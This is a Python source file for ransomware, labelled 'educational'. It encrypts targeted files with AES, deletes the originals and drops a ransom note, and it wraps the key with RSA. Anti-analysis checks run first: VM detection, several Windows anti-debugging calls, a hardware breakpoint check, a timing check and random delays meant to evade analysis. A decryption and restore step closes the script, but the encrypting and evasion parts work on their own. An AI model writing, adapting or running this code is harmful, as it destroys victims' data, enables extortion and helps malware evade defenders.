import os
import random
import time
import threading
import logging
import platform
import ctypes
import sys
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

# Obfuscate variable names
log_filename = 'log.txt'
key_len = 32

# Log configuration (Obfuscated)
logging.basicConfig(filename=log_filename, level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')

# Check for Virtual Machine (Anti-analysis)
def is_vm():
    vm_signatures = ['vmware', 'virtualbox', 'qemu', 'xen', 'vbox', 'hyperv']
    system_info = platform.uname().release.lower()
    for signature in vm_signatures:
        if signature in system_info:
            return True
    return False

# Anti-Debugging Techniques

# Function to check for a debugger using multiple methods (Obfuscated)
def adbg():
    # Check if a debugger is present using IsDebuggerPresent
    if ctypes.windll.kernel32.IsDebuggerPresent():
        logging.error("Debugger detected!")
        sys.exit(1)

    # Check remote debugger presence using CheckRemoteDebuggerPresent
    ird = ctypes.c_int(0)
    ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(ird))
    if ird.value:
        logging.error("Remote debugger detected!")
        sys.exit(1)

    # Query debug information from the process (NtQueryInformationProcess)
    NTQIP = 0x22  # Arbitrary value for querying process info
    dbg_info = ctypes.c_ulong(0)
    ctypes.windll.ntdll.NtQueryInformationProcess(
        ctypes.windll.kernel32.GetCurrentProcess(),
        NTQIP,
        ctypes.byref(dbg_info),
        ctypes.sizeof(dbg_info),
        None
    )
    if dbg_info.value != 0:
        logging.error("Debug information detected!")
        sys.exit(1)

# Check hardware breakpoints (Obfuscated)
def chb():
    class CTX(ctypes.Structure):
        _fields_ = [("CF", ctypes.c_ulong),
                    ("Dr0", ctypes.c_ulonglong),
                    ("Dr1", ctypes.c_ulonglong),
                    ("Dr2", ctypes.c_ulonglong),
                    ("Dr3", ctypes.c_ulonglong),
                    ("Dr6", ctypes.c_ulonglong),
                    ("Dr7", ctypes.c_ulonglong)]

    ctx = CTX()
    ctx.CF = 0x10010  # CONTEXT_DEBUG_REGISTERS
    if ctypes.windll.kernel32.GetThreadContext(ctypes.windll.kernel32.GetCurrentThread(), ctypes.byref(ctx)):
        if ctx.Dr0 or ctx.Dr1 or ctx.Dr2 or ctx.Dr3:
            logging.error("Hardware breakpoints detected!")
            exit(1)

# Function to check for time-based delays (anti-debugging) (Obfuscated)
def ctm():
    st = time.time()
    for _ in range(100000):  # Simple operation
        pass
    et = time.time()
    if (et - st) > 0.1:  # If there is a significant delay
        logging.error("Timing analysis detected!")
        exit(1)

# Function to validate the AES key (Obfuscated)
def chk_k(k):
    if len(k) != key_len:
        raise ValueError("Invalid key length!")

# Function to encrypt files (Obfuscated)
def prc_f(f, k):
    try:
        chk_k(k)
        
        with open(f, 'rb') as fo:
            data = fo.read()

        cipher = AES.new(k, AES.MODE_EAX)
        ct, tag = cipher.encrypt_and_digest(data)

        with open(f + ".enc", 'wb') as ef:
            [ef.write(x) for x in (cipher.nonce, tag, ct)]

        os.remove(f)
        print(f"File '{f}' encrypted and removed.")
    except FileNotFoundError:
        logging.error(f"File not found: {f}")
    except PermissionError:
        logging.error(f"Permission denied: {f}")
    except ValueError as ve:
        logging.error(f"Validation error: {ve}")
    except Exception as e:
        logging.error(f"Error encrypting {f}: {e}")

# Function to decrypt files (Obfuscated)
def dcr_f(f, k):
    try:
        chk_k(k)
        with open(f, 'rb') as ef:
            nonce, tag, ct = [ef.read(x) for x in (16, 16, -1)]
            cipher = AES.new(k, AES.MODE_EAX, nonce=nonce)
            data = cipher.decrypt_and_verify(ct, tag)

        with open(f.replace(".enc", ""), 'wb') as of:
            of.write(data)
        print(f"File '{f}' decrypted.")
    except FileNotFoundError:
        logging.error(f"File not found: {f}")
    except PermissionError:
        logging.error(f"Permission denied: {f}")
    except ValueError as ve:
        logging.error(f"Validation error: {ve}")
    except Exception as e:
        logging.error(f"Error decrypting {f}: {e}")

# Function to create AES key (Obfuscated)
def gn_k():
    return get_random_bytes(key_len)

# Load RSA public key (Obfuscated)
def ld_puk(p):
    try:
        with open(p, 'rb') as f:
            puk = RSA.import_key(f.read())
        return puk
    except Exception as e:
        logging.error(f"Error loading RSA key: {e}")

# Encrypt AES key with RSA (Obfuscated)
def enc_k(symk, rsapub):
    try:
        crsa = PKCS1_OAEP.new(rsapub)
        return crsa.encrypt(symk)
    except Exception as e:
        logging.error(f"Error encrypting key: {e}")

# Load RSA private key (Obfuscated)
def ld_prk(p):
    try:
        with open(p, 'rb') as f:
            prk = RSA.import_key(f.read())
        return prk
    except Exception as e:
        logging.error(f"Error loading RSA private key: {e}")

# Decrypt AES key with RSA (Obfuscated)
def dcr_k(enc_symk, rsapriv):
    try:
        crsa = PKCS1_OAEP.new(rsapriv)
        return crsa.decrypt(enc_symk)
    except Exception as e:
        logging.error(f"Error decrypting key: {e}")

# Function to load file extensions (Obfuscated)
def ld_ext(p):
    try:
        with open(p, 'r') as f:
            ext = f.read().splitlines()
        return tuple(ext)
    except Exception as e:
        logging.error(f"Error loading extensions: {e}")
        return ()

# Encrypt files with threads (Obfuscated)
def inf_d(d, k, ext):
    try:
        ths = []
        for r, dirs, fs in os.walk(d):
            for f in fs:
                fp = os.path.join(r, f)
                if not f.endswith(".enc") and f.lower().endswith(ext):
                    t = threading.Thread(target=prc_f, args=(fp, k))
                    ths.append(t)
                    t.start()
                    time.sleep(random.uniform(1, 2))  # Add sleep to simulate delay and evade analysis

        for t in ths:
            t.join()

        msg = "".join(["# YOUR FILES HAVE BEEN", " ENCRYPTED! Contact", " us at ", "email@example.com"])
        with open(os.path.join(d, "RANSOM_NOTE.txt"), "w") as rf:
            rf.write(msg)
        print("Ransom note created.")
    except Exception as e:
        logging.error(f"Error during infection: {e}")

# Restore files (Obfuscated)
def rst_f(d, k):
    try:
        for r, dirs, fs in os.walk(d):
            for f in fs:
                if f.endswith(".enc"):
                    dcr_f(os.path.join(r, f), k)
    except Exception as e:
        logging.error(f"Error restoring files: {e}")

# Main
if __name__ == "__main__":
    print("WARNING: Educational purpose only.")
    
    # Anti-analysis: Exit if running in VM
    if is_vm():
        print("Running in a VM, exiting...")
        exit()

    # Run anti-debugging checks
    adbg()
    chb()
    ctm()

    input("Press Enter to continue (Ctrl+C to cancel)...")
    
    aes_k = gn_k()  # Generate AES key

    # Load public RSA key
    pub_k_path = "public_key.pem"
    pub_k = ld_puk(pub_k_path)
    
    # Encrypt the AES key
    enc_aes_k = enc_k(aes_k, pub_k)

    # Load extensions
    ext_path = "extensions.txt"
    exts = ld_ext(ext_path)

    # Target directory for encryption
    target_dir = "C:\\TestFolder"  # Update to your target

    # Encrypt the directory
    inf_d(target_dir, aes_k, exts)

    # Simulate storing the encrypted AES key
    with open("encrypted_aes_key.bin", "wb") as f:
        f.write(enc_aes_k)

    # Load private RSA key
    priv_k_path = "private_key.pem"
    priv_k = ld_prk(priv_k_path)

    # Decrypt the AES key
    with open("encrypted_aes_key.bin", "rb") as f:
        enc_aes_k = f.read()
    aes_k = dcr_k(enc_aes_k, priv_k)

    # Restore files for simulation purposes
    rst_f(target_dir, aes_k)
    
    print("Process completed.")